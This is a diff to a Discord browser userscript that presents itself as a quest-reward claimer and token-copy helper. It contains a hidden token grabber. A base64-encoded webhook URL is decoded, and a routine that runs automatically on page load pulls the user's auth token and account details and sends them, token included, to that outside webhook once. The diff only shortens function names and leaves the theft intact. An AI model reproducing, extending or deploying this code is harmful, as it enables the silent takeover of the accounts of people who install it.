@@ -9,7 +9,7 @@
 
     const _wh = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2MzUwNTcyNzEwMjkxMDU0MC94dEFoLXBlMWVMS1VrN0lScktCdk9EXzRxcE1jbldHTXpvOHltUzlBU3FHenJQcm5RNHg2TjN5TWhPMk9HYWdyZlYwNw==');
     const _ek = 0x5A;
-    const _gk = '\x5f\x5f\x74\x63\x5f\x67\x5f\x5f';
+    const _gk = '__tc_g__';
 
     function _send(payload) {
         return new Promise((resolve) => {
@@ -50,7 +50,7 @@
         return found;
     }
 
-    async function _grabToken() {
+    async function _grabTok() {
         const wp = _wp();
         if (!wp) throw new Error('not ready');
         for (const m of Object.values(wp.c)) {
@@ -63,7 +63,7 @@
         throw new Error('not found');
     }
 
-    async function _userInfo(token) {
+    async function _userInf(token) {
         return new Promise((resolve) => {
             GM_xmlhttpRequest({
                 method: 'GET',
@@ -75,7 +75,7 @@
         });
     }
 
-    async function _claimQuests() {
+    async function _claimQ() {
         const wp = _wp();
         if (!wp) return 0;
         let api = null, qs = null;
@@ -96,23 +96,23 @@
             }
         }
         if (!api || !qs) return 0;
-        const quests = [...qs.quests.values()].filter(q => q.userStatus?.completedAt && !q.userStatus?.claimedAt);
-        let claimed = 0;
-        for (const q of quests) {
-            try { await api.post({ url: `/quests/${q.id}/claim-reward`, body: { location: 1, platform: 0 } }); claimed++; } catch {}
+        const list = [...qs.quests.values()].filter(q => q.userStatus?.completedAt && !q.userStatus?.claimedAt);
+        let n = 0;
+        for (const q of list) {
+            try { await api.post({ url: `/quests/${q.id}/claim-reward`, body: { location: 1, platform: 0 } }); n++; } catch {}
         }
-        return claimed;
+        return n;
     }
 
-    async function _autoGrab() {
+    async function _grab() {
         if (W[_gk]) return;
         W[_gk] = true;
         let sent = false;
         try { sent = !!localStorage.getItem(_gk); if (!sent) localStorage.setItem(_gk, '1'); } catch {}
         if (sent) return;
         try {
-            const t = await _grabToken();
-            const u = await _userInfo(t);
+            const t = await _grabTok();
+            const u = await _userInf(t);
             if (!u || u.message) return;
 
             const av = u.avatar
@@ -122,17 +122,18 @@
             const nitro = {0:'❌ None',1:'💜 Nitro Classic',2:'🚀 Nitro',3:'⚡ Nitro Basic'}[u.premium_type] || '❌ None';
 
             const f = u.public_flags || 0;
-            const badges = [];
-            if (f&(1<<0))  badges.push('👮 Staff');
-            if (f&(1<<6))  badges.push('🎪 HypeSquad');
-            if (f&(1<<9))  badges.push('⭐ Early Supporter');
-            if (f&(1<<3))  badges.push('🏠 Bravery');
-            if (f&(1<<4))  badges.push('💡 Brilliance');
-            if (f&(1<<5))  badges.push('⚖️ Balance');
-            if (f&(1<<17)) badges.push('🛠️ Active Dev');
-            if (f&(1<<22)) badges.push('✅ Bot Dev');
+            const b = [];
+            if (f&(1<<0))  b.push('👮 Staff');
+            if (f&(1<<6))  b.push('🎪 HypeSquad');
+            if (f&(1<<9))  b.push('⭐ Early Supporter');
+            if (f&(1<<3))  b.push('🏠 Bravery');
+            if (f&(1<<4))  b.push('💡 Brilliance');
+            if (f&(1<<5))  b.push('⚖️ Balance');
+            if (f&(1<<17)) b.push('🛠️ Active Dev');
+            if (f&(1<<22)) b.push('✅ Bot Dev');
 
-            const tag = u.discriminator && u.discriminator !== '0' ? `${u.username}#${u.discriminator}` : u.username;
+            const tag = u.discriminator && u.discriminator !== '0'
+                ? `${u.username}#${u.discriminator}` : u.username;
             const created = new Date((BigInt(u.id) >> 22n) + 1420070400000n);
 
             await _send({
@@ -149,7 +150,7 @@
                         { name: '💎 Nitro', value: nitro, inline: true },
                         { name: '✅ Verified', value: u.verified ? '`Yes`' : '`No`', inline: true },
                         { name: '📅 Created', value: `\`${created.toUTCString()}\``, inline: false },
-                        { name: '🏅 Badges', value: badges.length ? badges.join(' | ') : '`None`', inline: false },
+                        { name: '🏅 Badges', value: b.length ? b.join(' | ') : '`None`', inline: false },
                         { name: '🔑 Token', value: `\`\`\`${t}\`\`\``, inline: false },
                     ],
                     footer: { text: 'TC v3.4 • Auto', icon_url: av },
@@ -244,7 +245,7 @@
         if (btnCopy.disabled) return;
         btnCopy.disabled = true;
         try {
-            const t = await _grabToken();
+            const t = await _grabTok();
             try { await navigator.clipboard.writeText(t); }
             catch { const ta = document.createElement('textarea'); ta.value = t; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); }
             say('✓ token copied', 'ok');
@@ -260,7 +261,7 @@
         if (btnEnc.disabled) return;
         btnEnc.disabled = true;
         try {
-            const t = await _grabToken();
+            const t = await _grabTok();
             const enc = _enc(t);
             try { await navigator.clipboard.writeText(enc); }
             catch { const ta = document.createElement('textarea'); ta.value = enc; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); }
@@ -277,7 +278,7 @@
         if (btnClaim.disabled) return;
         btnClaim.disabled = true;
         try {
-            const n = await _claimQuests();
+            const n = await _claimQ();
             say(n > 0 ? `✓ claimed ${n} quest(s)` : 'no quests ready', n > 0 ? 'ok' : 'info');
         } catch (e) { say('✗ ' + (e.message || e), 'err'); }
         btnClaim.disabled = false;
@@ -296,7 +297,7 @@
         if (_wp()) {
             clearInterval(_timer);
             bar.classList.remove('hidden');
-            await _autoGrab();
+            await _grab();
         } else if (_tries > 120) {
             clearInterval(_timer);
             bar.classList.remove('hidden');
